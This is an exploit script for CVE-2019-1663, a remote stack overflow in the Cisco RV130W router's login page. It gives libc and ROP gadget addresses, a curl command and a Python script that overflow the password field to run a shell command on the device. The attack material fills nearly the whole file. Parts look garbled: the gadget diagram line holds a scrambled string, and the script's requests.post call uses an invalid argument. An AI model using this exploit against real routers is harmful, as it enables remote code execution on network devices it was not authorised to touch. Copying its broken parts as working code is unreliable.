#!/usr/bin/python
# Exploit Title: Cisco RV130W Remote Stack Overflow
# Google Dork: n/a
# Date: Advisory Published: Feb 2019
# Exploit Author: @0x00string
# Vendor Homepage: cisco.com
# Software Link: https://www.cisco.com/c/en/us/products/routers/rv130w-wireless-n-multifunction-vpn-router/index.html
# Version: 1.0.3.44 and prior
# Tested on: 1.0.3.44
# CVE : CVE-2019-1663
#
# 0x357fc000 - libc base addr
# 0x35849144 - system() addr
# 
# 0x0002eaf8 / 0x3582AAF8: pop {r4, r5, lr}; add sp, sp, #8; bx lr;
# 0x0000c11c / 0x3580811C: mov r2, r4; mov r0, r2; pop {r4, r5, r7, pc}; 
# 0x00041308 / 0x3583D308: mov r0, sp; blx r2;
# 
#   gadget 1    system()   junk   gadget 2   junk  junk  junk  junk  junk   gadget 3    text
# [0xeF44179038f46b139BC4B8f7E73E479642C5B302sYtnFex2UppPURJ4C6HidPZfEribm[0x3583D308][command]
#
# curl -k -X 'POST' --data "submit_button=login&submit_type=&gui_action=&default_login=1&wait_time=0&change_action=&enc=1&user=cisco&pwd=UUUUZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZVVVVWWWWXXXXYYYY`printf "\xf8\xaa\x82\x35\x44\x91\x84\x35AAAA\x1c\x81\x80\x35BBBBCCCCDDDDEEEEFFFF\x08\xd3\x83\x35ping 192.168.1.100\x00"`&sel_lang=EN" 'https://192.168.1.1:443/login.cgi'

#!/usr/bin/python
import requests

def banner():
    print '''
    ____              _     __   _____       ____                                __
   / __ \____ _____  (_)___/ /  / ___/____ _/ __/__  ____ ___  ______ __________/ /
  / /_/ / __ `/ __ \/ / __  /   \__ \/ __ `/ /_/ _ \/ __ `/ / / / __ `/ ___/ __  / 
 / _, _/ /_/ / /_/ / / /_/ /   ___/ / /_/ / __/  __/ /_/ / /_/ / /_/ / /  / /_/ /  
/_/ |_|\__,_/ .___/_/\__,_/   /____/\__,_/_/  \___/\__, /\__,_/\__,_/_/   \__,_/   
           /_/                                    /____/                            
             
             Twitter : Rapidsafeguard
             Instagram : Rapidsafeguard 
'''

def main():
    banner()
    command = "ping 192.168.1.100\x00"
    print ("Sending exploit to execute [" + command + "]\n")
    rop = "\xf8\xaa\x82\x35"+"\x44\x91\x84\x35"+"AAAA"+"\x1c\x81\x80\x35"+"BBBB"+"CCCC"+"DDDD"+"EEEE"+"FFFF"+"\x08\xd3\x83\x35"
    payload = ("Z" * 446) + rop + command
    url = "https://192.168.1.100:443/login.cgi"
    data = {'submit_button': 'login','submit_type': '','gui_action': '','default_login': '1','wait_time': '0','change_action': '','enc': '1','user': 'cisco','pwd': payload,'sel_lang': 'EN'}
    r = requests.post(url, payload=data)

if __name__ == "__main__":
    main()